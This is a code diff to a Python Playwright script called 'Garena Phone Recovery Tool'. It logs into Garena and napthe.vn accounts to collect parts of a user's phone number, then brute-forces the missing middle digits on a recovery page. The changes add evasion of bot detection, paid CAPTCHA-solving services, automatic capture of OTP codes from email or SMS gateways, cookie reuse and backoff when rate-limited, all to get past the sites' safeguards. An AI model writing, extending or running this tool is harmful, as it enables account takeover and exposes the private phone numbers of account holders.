@@ -27,6 +27,11 @@ from playwright.async_api import (
     BrowserContext,
     Playwright,
 )
+from captcha_solver import CaptchaSolver
+from otp_handler import OTPHandler
+from retry_manager import RetryManager
+from session_manager import SessionManager
+from stealth_mode import StealthMode
 
 # ============================================================================
 # CONFIG
@@ -365,6 +370,21 @@ async def detect_manual_verification(page: Page, phase: str) -> Optional[str]:
     return None
 
 
+def build_launch_kwargs(proxy: Optional[str], use_stealth: bool) -> Dict[str, Any]:
+    """Build browser launch args with optional stealth tuning"""
+    launch_args = ["--no-sandbox"]
+    if not use_stealth:
+        launch_args.append("--disable-blink-features=AutomationControlled")
+
+    launch_kwargs: Dict[str, Any] = {
+        "headless": True,
+        "args": launch_args,
+    }
+    if proxy:
+        launch_kwargs["proxy"] = {"server": proxy}
+    return launch_kwargs
+
+
 async def extract_auth_token(page: Page) -> str:
     """Extract auth token from localStorage/sessionStorage"""
     try:
@@ -400,19 +420,26 @@ async def phase1_garena_login(
     password: str,
     timeout: int = 45000,
     proxy: Optional[str] = None,
+    use_stealth: bool = False,
+    captcha_solver: Optional[CaptchaSolver] = None,
+    otp_handler: Optional[OTPHandler] = None,
+    session_manager: Optional[SessionManager] = None,
+    stealth_mode: Optional[StealthMode] = None,
 ) -> Tuple[Phase1Result, Optional[Page]]:
     """Phase 1: Login to Garena and extract last 4 digits"""
     result = Phase1Result(status="failed")
     
-    launch_kwargs = {
-        "headless": True,
-        "args": ["--no-sandbox", "--disable-blink-features=AutomationControlled"],
-    }
-    if proxy:
-        launch_kwargs["proxy"] = {"server": proxy}
+    launch_kwargs = build_launch_kwargs(proxy, use_stealth)
     
     try:
         async with managed_playwright_session(launch_kwargs) as (page, context):
+            if stealth_mode and stealth_mode.enabled:
+                await page.set_extra_http_headers(stealth_mode.default_headers(referer=LOGIN_URL))
+                await stealth_mode.inject_stealth_script(page)
+
+            if session_manager:
+                await session_manager.apply_cookies(context, username)
+
             print(f"  [Phase 1] Logging into Garena...")
             
             # Navigate to login
@@ -496,10 +523,26 @@ async def phase1_garena_login(
             
             verification_error = await detect_manual_verification(page, "Phase 1")
             if verification_error:
-                result.status = "manual_required"
-                result.error = verification_error
-                print(f"  [Phase 1] {verification_error}")
-                return result, None
+                if otp_handler and "otp required" in verification_error.lower():
+                    otp_code = await otp_handler.extract_from_email_api(otp_handler.otp_email)
+                    if not otp_code:
+                        otp_code = await otp_handler.extract_from_sms_gateway()
+                    if otp_code:
+                        otp_inputs = page.locator("input[name*='otp'], input[autocomplete='one-time-code'], input[type='tel']")
+                        if await otp_inputs.count() > 0:
+                            await otp_inputs.first.fill(otp_code)
+                            await asyncio.sleep(1)
+                            verification_error = await detect_manual_verification(page, "Phase 1")
+                if captcha_solver and "captcha" in verification_error.lower():
+                    print(f"  [Phase 1] CAPTCHA detected, waiting for manual solve...")
+                    solved = await captcha_solver.wait_for_manual_solve(page)
+                    if solved:
+                        verification_error = await detect_manual_verification(page, "Phase 1")
+                if verification_error:
+                    result.status = "manual_required"
+                    result.error = verification_error
+                    print(f"  [Phase 1] {verification_error}")
+                    return result, None
             
             # Check for login errors
             page_text = await page.evaluate("() => document.body.innerText")
@@ -518,6 +561,8 @@ async def phase1_garena_login(
             print(f"  [Phase 1] Extracting session data...")
             result.session.cookies = await extract_cookies(context)
             print(f"  [Phase 1] Cookies: {len(result.session.cookies)} items")
+            if session_manager:
+                await session_manager.save_cookies_to_file(result.session.cookies, username)
             
             access_token = await extract_auth_token(page)
             if access_token:
@@ -610,19 +655,25 @@ async def phase2_napthe_api(
     password: str,
     timeout: int = 45000,
     proxy: Optional[str] = None,
+    use_stealth: bool = False,
+    captcha_solver: Optional[CaptchaSolver] = None,
+    session_manager: Optional[SessionManager] = None,
+    stealth_mode: Optional[StealthMode] = None,
 ) -> Phase2Result:
     """Phase 2: Login napthe.vn and get first 3 digits from API"""
     result = Phase2Result(status="failed")
     
-    launch_kwargs = {
-        "headless": True,
-        "args": ["--no-sandbox", "--disable-blink-features=AutomationControlled"],
-    }
-    if proxy:
-        launch_kwargs["proxy"] = {"server": proxy}
+    launch_kwargs = build_launch_kwargs(proxy, use_stealth)
     
     try:
         async with managed_playwright_session(launch_kwargs) as (page, context):
+            if stealth_mode and stealth_mode.enabled:
+                await page.set_extra_http_headers(stealth_mode.default_headers(referer=NAPTHE_LOGIN_URL))
+                await stealth_mode.inject_stealth_script(page)
+
+            if session_manager:
+                await session_manager.apply_cookies(context, username)
+
             print(f"  [Phase 2] Logging into napthe.vn...")
             
             # Navigate
@@ -697,8 +748,14 @@ async def phase2_napthe_api(
             
             manual_required_error = await detect_manual_verification(page, "Phase 2")
             if manual_required_error:
-                result.error = manual_required_error
-                return result
+                if captcha_solver and "captcha" in manual_required_error.lower():
+                    print(f"  [Phase 2] CAPTCHA detected, waiting for manual solve...")
+                    solved = await captcha_solver.wait_for_manual_solve(page)
+                    if solved:
+                        manual_required_error = await detect_manual_verification(page, "Phase 2")
+                if manual_required_error:
+                    result.error = manual_required_error
+                    return result
             
             if "napthe.vn" not in current_url:
                 result.error = f"Not on napthe domain: {current_url}"
@@ -706,6 +763,8 @@ async def phase2_napthe_api(
             
             # Extract session
             result.session.cookies = await extract_cookies(context)
+            if session_manager:
+                await session_manager.save_cookies_to_file(result.session.cookies, username)
             access_token = await extract_auth_token(page)
             if access_token:
                 result.session.access_token = access_token
@@ -781,6 +840,11 @@ async def phase3_recovery_brute_force(
     phase3_delay: float = 4.0,
     timeout: int = 45000,
     proxy: Optional[str] = None,
+    use_stealth: bool = False,
+    captcha_solver: Optional[CaptchaSolver] = None,
+    retry_manager: Optional[RetryManager] = None,
+    session_manager: Optional[SessionManager] = None,
+    stealth_mode: Optional[StealthMode] = None,
 ) -> Phase3Result:
     """Phase 3: Login recovery page and brute-force middle 3 digits"""
     result = Phase3Result(status="failed")
@@ -789,15 +853,17 @@ async def phase3_recovery_brute_force(
         result.error = "Missing first 3 or last 4 digits"
         return result
     
-    launch_kwargs = {
-        "headless": True,
-        "args": ["--no-sandbox", "--disable-blink-features=AutomationControlled"],
-    }
-    if proxy:
-        launch_kwargs["proxy"] = {"server": proxy}
+    launch_kwargs = build_launch_kwargs(proxy, use_stealth)
 
     try:
         async with managed_playwright_session(launch_kwargs) as (page, _context):
+            if stealth_mode and stealth_mode.enabled:
+                await page.set_extra_http_headers(stealth_mode.default_headers(referer=RECOVERY_URL))
+                await stealth_mode.inject_stealth_script(page)
+
+            if session_manager:
+                await session_manager.apply_cookies(_context, username)
+
             print(f"  [Phase 3] Brute-force recovery (1000 attempts)...")
             print(f"  [Phase 3] Pattern: {first_3_digits}XXX{last_4_digits}")
             
@@ -829,8 +895,14 @@ async def phase3_recovery_brute_force(
             
             manual_required_error = await detect_manual_verification(page, "Phase 3")
             if manual_required_error:
-                result.error = manual_required_error
-                return result
+                if captcha_solver and "captcha" in manual_required_error.lower():
+                    print(f"  [Phase 3] CAPTCHA detected, waiting for manual solve...")
+                    solved = await captcha_solver.wait_for_manual_solve(page)
+                    if solved:
+                        manual_required_error = await detect_manual_verification(page, "Phase 3")
+                if manual_required_error:
+                    result.error = manual_required_error
+                    return result
             
             # Brute-force
             max_rate_limit_retries = 5
@@ -875,6 +947,15 @@ async def phase3_recovery_brute_force(
                             return result
                     
                     page_text = (await page.evaluate("() => document.body.innerText")).lower()
+                    if retry_manager and retry_manager.is_rate_limited(page_text):
+                        rate_limit_retries += 1
+                        if rate_limit_retries > max_rate_limit_retries:
+                            result.error = f"Rate limited (429) after {max_rate_limit_retries} retries"
+                            return result
+                        backoff_delay = retry_manager.exponential_backoff(rate_limit_retries)
+                        print(f"  [Phase 3] Rate limit detected. Backing off for {backoff_delay:.1f}s (retry {rate_limit_retries}/{max_rate_limit_retries})")
+                        await asyncio.sleep(backoff_delay)
+                        continue
                     if "429" in page_text or "too many" in page_text:
                         rate_limit_retries += 1
                         if rate_limit_retries > max_rate_limit_retries:
@@ -940,14 +1021,31 @@ async def process_account(
         result.proxy_used = proxy or ""
         if proxy:
             print(f"  Using proxy: {proxy}")
+
+    retry_manager = RetryManager(max_retries=args.max_retries)
+    session_manager = SessionManager()
+    captcha_solver = CaptchaSolver(provider=args.captcha_api, api_key=args.captcha_key)
+    otp_handler = OTPHandler(otp_email=args.otp_email)
+    stealth_mode = StealthMode(enabled=args.use_stealth)
     
     # ========== PHASE 1 ==========
     print(f"\n[Phase 1] {username}...")
-    result.phase1, _ = await phase1_garena_login(
-        username, password,
-        timeout=args.timeout,
-        proxy=proxy
-    )
+    for attempt in range(args.max_retries + 1):
+        result.phase1, _ = await phase1_garena_login(
+            username, password,
+            timeout=args.timeout,
+            proxy=proxy,
+            use_stealth=args.use_stealth,
+            captcha_solver=captcha_solver,
+            otp_handler=otp_handler,
+            session_manager=session_manager,
+            stealth_mode=stealth_mode,
+        )
+        if result.phase1.status == "success" or not retry_manager.is_temporary_error(result.phase1.error):
+            break
+        delay = retry_manager.exponential_backoff(attempt + 1)
+        print(f"  [Phase 1] Temporary error, retrying in {delay:.1f}s...")
+        await asyncio.sleep(delay)
     
     if result.phase1.status != "success":
         result.status = result.phase1.status
@@ -959,11 +1057,21 @@ async def process_account(
     
     # ========== PHASE 2 ==========
     print(f"\n[Phase 2] {username}...")
-    result.phase2 = await phase2_napthe_api(
-        username, password,
-        timeout=args.timeout,
-        proxy=proxy
-    )
+    for attempt in range(args.max_retries + 1):
+        result.phase2 = await phase2_napthe_api(
+            username, password,
+            timeout=args.timeout,
+            proxy=proxy,
+            use_stealth=args.use_stealth,
+            captcha_solver=captcha_solver,
+            session_manager=session_manager,
+            stealth_mode=stealth_mode,
+        )
+        if result.phase2.status == "success" or not retry_manager.is_temporary_error(result.phase2.error):
+            break
+        delay = retry_manager.exponential_backoff(attempt + 1)
+        print(f"  [Phase 2] Temporary error, retrying in {delay:.1f}s...")
+        await asyncio.sleep(delay)
     
     if result.phase2.status != "success":
         result.status = "failed"
@@ -981,7 +1089,12 @@ async def process_account(
         result.phase1.last_4_digits,
         phase3_delay=args.phase3_delay,
         timeout=args.timeout,
-        proxy=proxy
+        proxy=proxy,
+        use_stealth=args.use_stealth,
+        captcha_solver=captcha_solver,
+        retry_manager=retry_manager,
+        session_manager=session_manager,
+        stealth_mode=stealth_mode,
     )
     
     if result.phase3.status == "success":
@@ -1050,9 +1163,15 @@ async def main():
     parser.add_argument("--phase-delay", type=float, default=5.0, help="Delay between phases")
     parser.add_argument("--phase3-delay", type=float, default=4.0, help="Delay between brute-force attempts")
     parser.add_argument("--timeout", type=int, default=45000, help="Timeout (ms)")
+    parser.add_argument("--captcha-api", choices=["2captcha", "anticaptcha", "deathbycaptcha"], default="", help="CAPTCHA provider name (manual fallback is always enabled)")
+    parser.add_argument("--captcha-key", default="", help="CAPTCHA API key")
+    parser.add_argument("--use-stealth", action="store_true", help="Enable stealth browser mode")
+    parser.add_argument("--otp-email", default="", help="Email used for OTP extraction")
+    parser.add_argument("--max-retries", type=int, default=2, help="Maximum retries for temporary errors")
     
     args = parser.parse_args()
     args.use_proxy = not args.no_proxy
+    args.max_retries = max(0, args.max_retries)
     
     print("\n" + "="*60)
     print("Garena Phone Recovery Tool v9 - Resource Cleanup Fixed")
@@ -1067,6 +1186,10 @@ async def main():
             print("[WARN] No proxies found, running without proxy")
     
     print(f"[CONFIG] Phase delays: {args.phase_delay}s | Brute-force: {args.phase3_delay}s\n")
+    if args.captcha_api:
+        print(f"[CONFIG] CAPTCHA provider selected: {args.captcha_api} (manual solve fallback active)")
+    if args.use_stealth:
+        print("[CONFIG] Stealth mode: enabled")
     
     # Get accounts
     accounts = get_accounts_interactive()
